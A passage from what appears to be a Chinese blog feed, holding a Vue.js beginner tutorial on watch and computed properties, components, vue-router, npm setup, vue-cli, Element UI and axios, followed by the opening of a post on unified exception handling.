class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">           <span class="title function_">isShow</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="variable language_">this</span>.<span class="property">flag</span> = !<span class="variable language_">this</span>.<span class="property">flag</span>;</span></span><br><span class="line"><span class="language-javascript">           &#125;,</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="3-3-vue侦听属性和计算属性-了解"><a href="#3-3-vue侦听属性和计算属性-了解" class="headerlink" title="3.3 vue侦听属性和计算属性(了解)"></a>3.3 vue侦听属性和计算属性(了解)</h3><ul>
<li>watch属性</li>
<li>computed 属性</li>
</ul>
<p>代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;msg&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      &#123;&#123;birth&#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">msg</span>: <span class="string">&quot;xx&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>:<span class="string">&quot;tom&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">date</span>: <span class="number">1713429960000</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>:&#123;&#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">watch</span>:&#123; <span class="comment">// 监听属性</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 参数一：新值，参数二：上一次的值</span></span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">msg</span>(<span class="params">a,b</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">debug</span>(a,b);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">computed</span>:&#123; <span class="comment">// 计算属性</span></span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">birth</span>(<span class="params"></span>)&#123; <span class="comment">// 处理时间戳---》时间</span></span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">let</span> d = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="variable language_">this</span>.<span class="property">date</span>);</span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">return</span>  d.<span class="title function_">getFullYear</span>()+<span class="string">&quot;年:&quot;</span>+d.<span class="title function_">getMonth</span>()+<span class="string">&quot;月:&quot;</span>+d.<span class="title function_">getDate</span>()+<span class="string">&quot;日&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="3-4-vue组件-很重要"><a href="#3-4-vue组件-很重要" class="headerlink" title="3.4 vue组件(很重要)"></a>3.4 vue组件(很重要)</h3><ul>
<li><p>全局组件 </p>
<p>任意的挂载点都可以使用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 语法：</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&quot;aa&quot;</span>,&#123;</span><br><span class="line">	template : <span class="string">&quot;&lt;h1&gt;这是全局组件&lt;/h1&gt;&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p> 全局组件代码案例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">my-component</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app2&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">my-component</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;mytemp&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h1</span>&gt;</span>全局组件<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 定义组件：  myComponent： 自定义的标签</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * 注意事项：</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     *    1. 标签尽量不要大写</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     *    2. 模版中有且只能有一个根标签</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     */</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 模版的定义方式： 在&lt;template&gt;标签中定义thml内容</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&quot;myComponent&quot;</span>,&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">template</span>:<span class="string">&quot;#mytemp&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="attr">msg</span>: <span class="string">&quot;张三&quot;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">msg</span>:<span class="string">&quot;你好&quot;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&quot;#app2&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">msg</span>:<span class="string">&quot;你好&quot;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<ul>
<li><p>局部组件</p>
<p>只能在某一个vue实例的挂载点使用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 语法</span></span><br><span class="line"><span class="keyword">var</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span><br><span class="line">    <span class="attr">data</span>: &#123;&#125;,</span><br><span class="line">    components : &#123;</span><br><span class="line">        <span class="string">&quot;局部组件的名字1&quot;</span> : &#123;组件的配置对象&#125;,</span><br><span class="line">        <span class="string">&quot;局部组件的名字2&quot;</span> : &#123;组件的配置对象&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li>
</ul>
<p>​       局部组件代码案例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">innercomponent1</span>&gt;</span><span class="tag">&lt;/<span class="name">innercomponent1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">innercomponent2</span>&gt;</span><span class="tag">&lt;/<span class="name">innercomponent2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;&#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">components</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&quot;innercomponent1&quot;</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">template</span>: <span class="string">&quot;&lt;h1&gt;我是局部组件1-----&#123;&#123;msg&#125;&#125;&lt;/h1&gt;&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">msg</span>: <span class="string">&quot;xx&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&quot;innercomponent2&quot;</span>:&#123;<span class="attr">template</span>: <span class="string">&quot;&lt;h1&gt;我是局部组件2&lt;/h1&gt;&quot;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="3-5-vue路由（很重要）"><a href="#3-5-vue路由（很重要）" class="headerlink" title="3.5 vue路由（很重要）"></a>3.5 vue路由（很重要）</h3><p> <strong>什么是路由</strong>？</p>
<p>后端：对于普通网站，所有的超链接都对应一个url地址，每个url都对应服务器上的资源</p>
<p>前端：对于单页面应用程序来说的，主要通过url中的#（hash）去实现的，(当关于a标签)</p>
<p><strong>路由使用</strong></p>
<p>引入vue-router.js文件</p>
<p>案例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue-router.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/index&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/dept&quot;</span>&gt;</span>部门<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/emp&quot;</span>&gt;</span>员工<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">&lt;!-- // 路由出口--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 1. 定义组件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> <span class="variable constant_">INDEX</span> = <span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&quot;index&quot;</span>,&#123;<span class="attr">template</span>:<span class="string">&quot;&lt;h1&gt;首页&lt;/h1&gt;&quot;</span>&#125;);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> <span class="variable constant_">EMP</span> = <span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&quot;emp&quot;</span>,&#123;<span class="attr">template</span>:<span class="string">&quot;&lt;h1&gt;员工管理页面&lt;/h1&gt;&quot;</span>&#125;);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> <span class="variable constant_">DEPT</span> = <span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&quot;dept&quot;</span>,&#123;<span class="attr">template</span>:<span class="string">&quot;&lt;h1&gt;部门管理页面&lt;/h1&gt;&quot;</span>&#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 2. 定义路由</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> routes = [</span></span><br><span class="line"><span class="language-javascript">        &#123;<span class="attr">path</span>: <span class="string">&quot;/index&quot;</span>,<span class="attr">component</span>: <span class="variable constant_">INDEX</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">        &#123;<span class="attr">path</span>: <span class="string">&quot;/dept&quot;</span>,<span class="attr">component</span>: <span class="variable constant_">DEPT</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">        &#123;<span class="attr">path</span>: <span class="string">&quot;/emp&quot;</span>,<span class="attr">component</span>: <span class="variable constant_">EMP</span>&#125;</span></span><br><span class="line"><span class="language-javascript">    ]</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 3. 创建路由实例</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        routes  <span class="comment">//相当于 routes: routes</span></span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;&#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 4. 使用路由</span></span></span><br><span class="line"><span class="language-javascript">        router    <span class="comment">//router: router</span></span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<hr>
<h2 id="4-nodejs和npm"><a href="#4-nodejs和npm" class="headerlink" title="4. nodejs和npm"></a>4. nodejs和npm</h2><h3 id="4-1-什么是nodejs和npm？"><a href="#4-1-什么是nodejs和npm？" class="headerlink" title="4.1 什么是nodejs和npm？"></a>4.1 什么是nodejs和npm？</h3><p><em><strong>*Node：是JavaScript的运行时环境*</strong></em>。Node并不是一个新的语言，只是js的一个环境，同样的比如：tomcat。Node为js提供了更强大的操作方式，如：在浏览器中，js是无法操作文件的，而node提供了文件操作。在浏览器中，js无法写服务接口，node提供了后端代码编写的功能（写后台、操作数据库）。尽管如此，Node依然是个前端技术，并不会真正的使用node去写后端代码，<em><strong>*node更多的是给前端项目做配置*</strong></em>，如：跨域代理。</p>
<p><em><strong>*Npm：npm是node提供的一个包管理工具，类似于maven*</strong></em>。通过npm去安装依赖包，就不需要在页面上使用script标签引入了。 前端也有依赖 </p>
<p>命令：-g（globle）全局安装，任何项目都可以用。–save-dev开发环境安装，不会打包到生产。生产安装（默认）</p>
<p>大前端工程: 人家可以使用node js 开发数据接口, 但是nodejs 的速度很差.</p>
<h3 id="4-2-node下载和安装"><a href="#4-2-node下载和安装" class="headerlink" title="4.2 node下载和安装"></a>4.2 node下载和安装</h3><ul>
<li><p>下载地址： <a href="http://nodejs.cn/">http://nodejs.cn/</a></p>
</li>
<li><p>安装（略） <strong>不要安装在有中文，特殊字符等目录</strong>！！！！！！！！！！！</p>
</li>
<li><p>测试安装是否成功</p>
<p>cmd命令  输入 node -v</p>
<p>cmd命令  输入  npm -v</p>
</li>
<li><p>npm镜像加速器配置</p>
<p>执行命令 ：npm config set registry <a href="https://registry.npm.taobao.org/">https://registry.npm.taobao.org</a>  （过期了，不能用了）</p>
<p>​                    npm config set registry <a href="https://registry.npmmirror.com/">https://registry.npmmirror.com/</a>   （可以使用，没过期）</p>
<p>删除淘宝镜像源： npm config delete registry</p>
<p>查看当前镜像源：npm config get registry</p>
<p>清缓存命令：npm cache clean –force</p>
<p>npm 常用命令：</p>
<p>安装命令：   npm install  xx    简写成 npm i xx</p>
</li>
</ul>
<hr>
<h2 id="5-vue-cli-脚手架"><a href="#5-vue-cli-脚手架" class="headerlink" title="5. vue-cli 脚手架"></a>5. vue-cli 脚手架</h2><h3 id="5-1-什么是vue-cli"><a href="#5-1-什么是vue-cli" class="headerlink" title="5.1. 什么是vue-cli"></a>5.1. 什么是vue-cli</h3><p>vue脚手架指的是vue-cli，它是一个专门为单页面应用快速搭建繁杂的脚手架，它可以轻松的创建新的应用程序而且可用于自动生成vue和webpack的项目模板。</p>
<p>vue-cli是有Vue提供的一个官方cli，专门为单页面应用快速搭建繁杂的脚手架。它是用于自动生成vue.js+webpack的项目模板。</p>
<h3 id="5-2-vue-cli安装"><a href="#5-2-vue-cli安装" class="headerlink" title="5.2. vue-cli安装"></a>5.2. vue-cli安装</h3><p>全局安装：</p>
<p>npm install -g @vue&#x2F;cli</p>
<h3 id="5-3-查看版本信息"><a href="#5-3-查看版本信息" class="headerlink" title="5.3. 查看版本信息"></a>5.3. 查看版本信息</h3><p>vue -V</p>
<h3 id="5-4-使用vue-cli创建项目"><a href="#5-4-使用vue-cli创建项目" class="headerlink" title="5.4. 使用vue-cli创建项目"></a>5.4. 使用vue-cli创建项目</h3><p>  方式很多，我们这里面使用的是命令(idea)</p>
<ol>
<li>手动创建：  <strong>vue create my-project</strong>       <strong>注意</strong>：项目名不能有大写</li>
<li>使用idea创建： (看视频)</li>
<li>启动命令： npm run serve</li>
<li>打包命令： npm run build</li>
</ol>
<hr>
<p><strong>单页面组件</strong>： 以.vue结尾的文件</p>
<p>   三部分：</p>
<p>​    1. <template> ：编写 html代码</p>
<p>​    2. <script>:  编写js代码的</p>
<p>​    3. <style>: 编写样式的。</p>
<h2 id="6-elementUi框架"><a href="#6-elementUi框架" class="headerlink" title="6. elementUi框架"></a>6. elementUi框架</h2><p>[官网地址] (<a href="https://element.eleme.cn/#/zh-CN/component/installation">https://element.eleme.cn/#/zh-CN/component/installation</a>)</p>
<p>使用：</p>
<ol>
<li>安装：   npm i element-ui -S </li>
<li>使用</li>
</ol>
<p>在 main.js 中写入以下内容：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ElementUI</span> <span class="keyword">from</span> <span class="string">&#x27;element-ui&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;element-ui/lib/theme-chalk/index.css&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">ElementUI</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="7-axios使用"><a href="#7-axios使用" class="headerlink" title="7. axios使用"></a>7. axios使用</h2><p> 官网地址： <a href="https://www.axios-http.cn/docs/intro">起步 | Axios中文文档 | Axios中文网 (axios-http.cn)</a> </p>
<ul>
<li>下载安装</li>
</ul>
<p>​      npm install axios </p>
<ul>
<li><p>main.js中配置</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入axios</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&quot;axios&quot;</span>; <span class="comment">// 对vue实例中添加了一个属性xxyy,值为axios</span></span><br><span class="line">axios.<span class="property">defaults</span>.<span class="property">baseURL</span>=<span class="string">&#x27;http://localhost:8081&#x27;</span> <span class="comment">// 配置axios全局基本路径</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$http</span>=axios;</span><br></pre></td></tr></table></figure>


</li>
<li><p>使用案例</p>
</li>
</ul>
<hr>
<h2 id="8-dept-emp练习-略"><a href="#8-dept-emp练习-略" class="headerlink" title="8. dept+emp练习(略)"></a>8. dept+emp练习(略)</h2><hr>
<h2 id="9-扩展："><a href="#9-扩展：" class="headerlink" title="9. 扩展："></a>9. 扩展：</h2><h3 id="1-props"><a href="#1-props" class="headerlink" title="1. props"></a>1. props</h3><h3 id="2-vuex"><a href="#2-vuex" class="headerlink" title="2. vuex"></a>2. vuex</h3><h3 id="3-vue3新特性"><a href="#3-vue3新特性" class="headerlink" title="3. vue3新特性"></a>3. vue3新特性</h3><h3 id="4-vue生命周期"><a href="#4-vue生命周期" class="headerlink" title="4. vue生命周期"></a>4. vue生命周期</h3><p>​	<strong>重点关注mounted函数</strong></p>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>前端</tag>
        <tag>Axios</tag>
        <tag>element-ui</tag>
      </tags>
  </entry>
  <entry>
    <title>统一异常处理和认证思想</title>
    <url>/2024/07/28/%E7%BB%9F%E4%B8%80%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E4%B8%8E%E8%AE%A4%E8%AF%81%E6%80%9D%E6%83%B3/</url>
    <content><![CDATA[<h1 id="文章内容"><a href="#文章内容" class="headerlink" title="文章内容"></a>文章内容</h1><ul>
<li>异常处理(重要)</li>
<li>JSR303校验</li>
<li>错误码抽取</li>
<li>统一认证思想(重要)</li>
</ul>
<h2 id="一-异常处理"><a href="#一-异常处理" class="headerlink" title="一.异常处理"></a>一.异常处理</h2><p>需求说明：为了不在controller编写大量的try-catch代码，需要进行统一异常处理，同时要进行错误信息以及错误码的统一管理，建议使用枚举进行错误码封装。同时要求系统支持JS303校验规则。</p>
